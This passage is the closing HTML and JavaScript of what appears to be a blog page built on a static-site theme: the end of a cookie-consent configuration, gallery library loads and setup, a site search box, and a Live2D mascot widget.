        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>